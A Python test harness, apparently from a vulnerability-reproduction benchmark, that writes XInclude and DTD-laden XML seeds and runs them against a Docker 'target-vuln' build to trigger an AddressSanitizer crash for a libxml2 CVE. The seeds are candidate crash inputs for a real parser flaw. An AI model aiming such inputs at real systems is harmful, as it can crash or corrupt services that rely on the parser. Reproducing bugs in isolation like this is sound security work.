import os
import subprocess

# Patterns to test
PATTERNS = {
    "text_parse": {
        "main": """<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root (xi:include)>
<!ELEMENT xi:include (#PCDATA)>
<!ATTLIST root xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ATTLIST xi:include xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ATTLIST xi:include href CDATA #REQUIRED>
<!ATTLIST xi:include parse CDATA #REQUIRED>
]>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="inc_text.txt" parse="text"/>
</root>""",
        "inc": "Just some text",
        "inc_name": "inc_text.txt"
    },
    "double_include": {
        "main": """<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root (xi:include+)>
<!ELEMENT xi:include EMPTY>
<!ATTLIST root xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ATTLIST xi:include xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ATTLIST xi:include href CDATA #REQUIRED>
]>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="inc_double.xml"/>
<xi:include href="inc_double.xml"/>
</root>""",
        "inc": "<x>I</x>",
        "inc_name": "inc_double.xml"
    },
    "backtrack_correct": {
        "main": """<?xml version="1.0"?>
<!DOCTYPE root [
<!ELEMENT root (a | b | c)*>
<!ELEMENT a (#PCDATA)>
<!ELEMENT b (#PCDATA)>
<!ELEMENT c ANY>
<!ATTLIST root xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ELEMENT xi:include EMPTY>
<!ATTLIST xi:include xmlns:xi CDATA #FIXED "http://www.w3.org/2001/XInclude">
<!ATTLIST xi:include href CDATA #REQUIRED>
]>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <a>first</a>
  <c>
    <xi:include href="inc_back.xml"/>
  </c>
  <b>last</b>
</root>""",
        "inc": "<x>Content</x>",
        "inc_name": "inc_back.xml"
    }
}

def run_test():
    for name, data in PATTERNS.items():
        print(f"\n>>> Testing Pattern: {name}")
        
        # Write seeds
        with open(f"tasks/CVE-2024-25062_libxml2/seeds/seed_{name}.xml", "w") as f:
            f.write(data["main"])
        
        with open(f"tasks/CVE-2024-25062_libxml2/seeds/{data['inc_name']}", "w") as f:
            f.write(data["inc"])
            
        # Run Docker
        cmd = f"docker compose -f tasks/CVE-2024-25062_libxml2/compose.yml run --rm target-vuln /seeds/seed_{name}.xml"
        try:
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            print("Exit Code:", res.returncode)
            if "AddressSanitizer" in res.stderr or "AddressSanitizer" in res.stdout:
                print("!!! CRASH DETECTED !!!")
                print(res.stderr[:500])
                return True
            else:
                print("Output snippet:")
                print(res.stderr[:200])
        except Exception as e:
            print(f"Error: {e}")

    return False

if __name__ == "__main__":
    run_test()
